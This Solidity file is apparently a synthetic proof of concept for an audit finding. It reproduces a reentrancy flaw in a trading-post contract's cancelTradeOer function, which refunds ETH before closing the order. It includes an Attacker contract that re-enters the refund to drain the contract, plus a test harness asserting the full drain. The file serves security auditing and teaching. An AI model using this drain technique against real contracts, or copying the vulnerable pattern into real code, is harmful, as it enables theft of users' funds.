// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  IOTA Heroes TradingPost — cancelTradeOer refunds before clearing state
    (AuditOne, finding #21014).
    SYNTHETIC, cheatcode-free. The report says cancelTradeOer calls out with
    the escrowed value and updates state afterwards, and that the function
    has no reentrancy guard (TradingPost.sol L154 at commit 3e345747, repo
    unpublished). Re-entering cancel pays the same order price until the
    contract's ETH is gone. */

contract TradingPost {
    struct Order {
        address seller;
        uint256 price;
        bool open;
    }

    mapping(uint256 => Order) public orders;

    function seed(uint256 id, address seller, uint256 price) external {
        orders[id] = Order(seller, price, true);
    }

    function fund() external payable {}

    function cancelTradeOer(uint256 id) external virtual {
        Order memory o = orders[id];
        require(o.open && o.seller == msg.sender, "order");
        // @> VULN: refund call happens before orders[id] is closed
        (bool ok,) = msg.sender.call{value: o.price}("");
        require(ok, "refund");
        orders[id].open = false;
    }
}

contract Attacker {
    TradingPost public post;
    uint256 public id_;

    constructor(TradingPost post_) {
        post = post_;
    }

    function go(uint256 id) external {
        id_ = id;
        post.cancelTradeOer(id);
    }

    receive() external payable {
        if (address(post).balance >= 1 ether) {
            try post.cancelTradeOer(id_) {} catch {}
        }
    }
}

contract Exploit {
    TradingPost public post;
    Attacker public attacker;

    constructor() {
        post = new TradingPost();
        attacker = new Attacker(post);
    }

    function run() external payable {
        require(msg.value == 6 ether, "fund");
        post.seed(7, address(attacker), 1 ether);
        post.fund{value: 6 ether}();
        attacker.go(7);
        require(address(attacker).balance == 6 ether, "drained");
        require(address(post).balance == 0, "empty");
    }
}
